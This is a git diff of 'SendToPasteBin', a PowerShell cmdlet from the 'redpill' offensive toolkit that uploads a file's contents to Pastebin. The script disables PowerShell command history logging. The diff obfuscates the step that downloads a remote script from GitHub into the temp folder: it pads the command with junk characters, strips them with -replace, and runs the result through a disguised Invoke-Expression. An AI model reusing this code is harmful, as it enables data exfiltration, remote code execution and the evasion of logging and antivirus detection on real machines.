@@ -4,9 +4,9 @@
     
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19042) x64 bits
-   Required Dependencies: Inv`oke-We`bRequ`est {native}
-   Optional Dependencies: Out-PasteBin.ps1 {auto}
-   PS cmdlet Dev version: v1.1.5
+   Required Dependencies: Out-PasteBin.ps1 {auto}
+   Optional Dependencies: none
+   PS cmdlet Dev version: v1.1.6
    
 .DESCRIPTION
    Uses Out-PasteBin.ps1 cmdlet to take the contents of -filepath 'string'
@@ -92,9 +92,9 @@
 )
 
 
-$cmdletVersion = "v1.1.5"
+$cmdletVersion = "v1.1.6"
 $ErrorActionPreference = "SilentlyContinue"
-#Disable Powershell Command Logging for current session.
+## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "SendToPasteBin $cmdletVersion"
 If($Egg -ieq "False")
@@ -127,7 +127,8 @@ For($i=0; $i -lt $MaxPastes; $i++)
    {
       ## Download Out-Pastebin cmdlet from my github repository
       If($Egg -ieq "False"){write-host "* Downloading Out-PasteBin cmdlet .." -ForegroundColor Green}
-      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Out-Pastebin.ps1" -OutFile "$Env:TMP\Out-Pastebin.ps1"|Unblock-File   
+      $ChkDisk = "@i£w@r -£u@r@i `"h£t@tps:/@/raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Out-Pastebin.ps1`" -£O@u£tF@i£l@e `"`$Env:TMP\Out-Pastebin.ps1`"|Unblock-File" -replace '(@|£)',''
+      $ChkDisk|&('Rex' -replace 'R','I')
    }
 
    If($Egg -ieq "False")
